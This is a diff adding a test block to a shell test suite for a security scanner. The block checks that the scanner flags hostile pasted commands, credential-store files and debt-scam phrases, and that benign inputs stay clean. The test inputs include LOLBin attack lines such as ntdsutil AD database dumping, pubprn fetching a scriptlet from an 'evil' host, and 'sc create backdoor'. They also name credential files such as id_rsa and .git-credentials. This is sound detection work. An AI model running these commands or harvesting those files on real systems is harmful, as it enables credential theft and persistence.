@@ -11671,6 +11671,55 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-221: ntdsutil/LOLBin wave-5 + cred-config files + robocall ─
+for c in \
+    'ntdsutil "ac i ntds" "ifm" "create full c:\\t" q q' \
+    'pubprn 10.0.0.1 script:http://evil/x.sct' \
+    'printui /u /n \\evil\share' \
+    'verclsid /s {guid}' \
+    'runonce /alternateshellstartup evil.exe' \
+    'settingsynchost -loadembedding x.exe' \
+    'sc create backdoor binpath= evil.exe' \
+    'control x.cpl' \
+    'findstr /v "" secret.txt'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'ntdsutil local roles' 'printui /ge' 'verclsid /q' \
+         'runonce /runonce' 'sc query w32time' 'control printers' \
+         'findstr /n x file.txt'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+for f in .git-credentials .my.cnf .s3cfg; do
+    printf 'x' > "/tmp/hlse221$f"
+    ./hlse_core file "/tmp/hlse221$f" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "file: $f cred-store flagged" "0" "0" \
+        || check "file: $f cred-store flagged" "0" "1"
+done
+printf 'x' > /tmp/hlse221_id_rsa
+./hlse_core file /tmp/hlse221_id_rsa 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+    && check "file: id_rsa flagged" "0" "0" \
+    || check "file: id_rsa flagged" "0" "1"
+for f in .netrc .pgpass .htpasswd .ovpn .npmrc; do
+    printf 'x' > "/tmp/hlse221$f"
+    ./hlse_core file "/tmp/hlse221$f" 2>&1 | grep -q '^OK' \
+        && check "file FP guard: empty $f stays content-gated" "0" "0" \
+        || check "file FP guard: empty $f stays content-gated" "0" "1"
+done
+check_text_hit 'call cardholder services' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: cardholder services flagged"
+check_text_hit 'settle your debt for less' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: settle your debt flagged"
+check_text_hit 'repair your credit' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: repair your credit flagged"
+check_text_hit 'your credit score dropped' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: credit score dropped flagged"
+./hlse_core text 'debt is bad' 2>&1 | grep -q '^OK' \
+    && check "text FP guard: debt prose clean" "0" "0" \
+    || check "text FP guard: debt prose clean" "0" "1"
+./hlse_core text 'my credit card' 2>&1 | grep -q '^OK' \
+    && check "text FP guard: credit card prose clean" "0" "0" \
+    || check "text FP guard: credit card prose clean" "0" "1"
+
 # ── cycle-220: JNDI lookup schemes + ransomware-prep LOLBin wave ─────
 for sch in jndi rmi iiop corba dns nis nds nio t3 t3s; do
     ./hlse_core "$sch://evil.example/x" 2>&1 | grep -q 'Cleartext/legacy' \
